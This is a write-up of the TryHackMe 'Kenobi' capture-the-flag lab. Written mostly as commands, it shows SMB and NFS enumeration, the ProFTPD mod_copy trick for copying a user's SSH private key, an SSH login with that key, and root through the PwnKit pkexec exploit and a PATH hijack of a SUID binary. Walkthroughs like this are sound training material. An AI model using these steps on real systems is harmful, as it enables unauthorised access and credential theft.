---
title: "Kenobi"
date: 2024-01-31
draft: false
summary: "Writeup for Kenobi CTF challenge on TryHackMe."
tags: ["linux", "lfi", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/kenobi/cover.webp"
  caption: "Kenobi TryHackMe Challenge"
  alt: "Kenobi cover"
platform: "TryHackMe"
---

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.
<!--more-->
To access the challenge, click on the link given below:
- https://tryhackme.com/r/room/kenobi

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on it.

```shell
nmap -A -p- TARGET -Pn -oN kenobi.nmap --min-rate 10000
```

![](https://cdn.ziomsec.com/kenobi/1.webp)

The scan revealed various services like **ftp**, **ssh**, **http**, **smb** and **nfs** to be running on the system.

## Initial Foothold

Since the target had an **smb** server, I performed enumeration using **nmap** and listed the shares present on the target.

```shell
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET
```

![](https://cdn.ziomsec.com/kenobi/2.webp)

I connected to the **anonymous** share and downloaded a file called **log.txt**

```bash
smbclient //10.10.146.176/anonymous
ls
get log.txt log.txt
```

![](https://cdn.ziomsec.com/kenobi/3.webp)

The logs file revealed interesting information like a user, path to their ssh key etc.

I then checked the directory that was shared by the target over **nfs**

```shell
showmount -e TARGET
```

![](https://cdn.ziomsec.com/kenobi/4.webp)

I then searched **exploit-db** for exploits related to the **ftp** version running on the target.

```shell
searchsploit 'ProFTP 1.3.5'
```

![](https://cdn.ziomsec.com/kenobi/5.webp)

I downloaded the exploit information on my system and analyzed it.

```shell
searchsploit -m linux/remote/36742.txt
cat 36742.txt
```

![](https://cdn.ziomsec.com/kenobi/6.webp)

![](https://cdn.ziomsec.com/kenobi/7.webp)

The file revealed that the **ftp** version running on the target allowed unauthenticated clients to copy files and paste files within the system. Since I had discovered the **`/var`** folder to be mounted over **nfs**, I created a directory and mounted it to the server so that I could access the files inside `/var` directory.

```shell
mkdir haha
mount -t nfs TARGET:/var haha
```

![](https://cdn.ziomsec.com/kenobi/8.webp)

After that, I followed the instructions given in the POC. I connected to the **ftp** server using **nc** and used the **`SITE CPFR`** to copy **kenobi's** private key and **`SITE CPTO`** to paste it in the `/var/tmp` directory.

```shell
nc TARGET 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/kenobi.key
```

![](https://cdn.ziomsec.com/kenobi/9.webp)

I then copied the private key onto my system from the **nfs** mounted directory.

```shell
cd haha/tmp
cp kenobi.key ../../kenobi.key
```

I fixed the file permission and logged into the target as **kenobi** via **ssh**.

```shell
chmod 600 kenobi.key
ssh -i kenobi.key kenobi@TARGET
```

![](https://cdn.ziomsec.com/kenobi/10.webp)

I then captured *user.txt* from **`/home/kenobi`**.

![](https://cdn.ziomsec.com/kenobi/11.webp)

## Privilege Escalation
### Exploiting `pkexec`

I listed binaries with **suid** bits using the following command:

```bash
find / -user root -perm -u=s -ls 2>/dev/null
```

Here I found **pkexec**. Since I had exploited this binary in the past, I googled the **pwnkit exploit**.
- https://github.com/ly4k/PwnKit

From the **github** repo, I downloaded it onto my system and transferred it to the target. Upon executing the exploit, I got **root** access.

```shell
chmod +x ./PwnKit
./PwnKit
```

I navigated to the **`/root`** directory and captured the final flag.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/kenobi/12.webp)

### Exploiting SUID

I looked for binaries with **suid** bit and found a custom binary called **menu**.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/kenobi/13.webp)

So I used **strings** to analyze the strings present in the binaries.

```shell
strings /usr/bin/menu
```

![](https://cdn.ziomsec.com/kenobi/14.webp)

Here I found that based on the option selected by the user, it directly executed the system command without providing a complete path to the binary.

![](https://cdn.ziomsec.com/kenobi/15.webp)

I could leverage this vulnerability to modify the system path and become a root user. So, I created a custom binary called **curl** and added it at the start of the **PATH** variable. Hence, if I would execute that particular command through the **menu** binary, I would get **root** access.

```shell
cd /tmp
echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

I executed the **status check** option and got **root** access.

```shell
/usr/bin/menu
```

![](https://cdn.ziomsec.com/kenobi/16.webp)

## Closure

Here's a brief summary of how I pwned **kenobi**:
- The **nmap** scan revealed **ssh, ftp, smb, nfs** and **http** service running on the target.
- Here's how I used them to get initial access:
	-  **smb** server had a share that allowed anonymous access. Through this, I got a log file that revealed user and their **ssh** key path.
	- **ftp** server was vulnerable and allowed unauthenticated users to copy and paste files within the system.
	- **nfs** server had the **`/var`** directory mounted.
	- The **ftp** vulnerability was exploited to copy **kenobi's** private key to the directory mounted over **nfs**. 
	- This private key was used to then log in as **kenobi**
- I then captured the first flag from **kenobi's** home directory.
- I then listed the binaries with **suid** bits and found 2 ways to become root:
	- I could exploit **pkexec** using **pwnkit** and get **root** access.
	- I could exploit the custom binary with **suid** bit that executed system commands without specifying the complete path to it.
- Finally I captured the final flag from **`/root`** directory.

That's it from my side! 
Happy Hacking :)

---
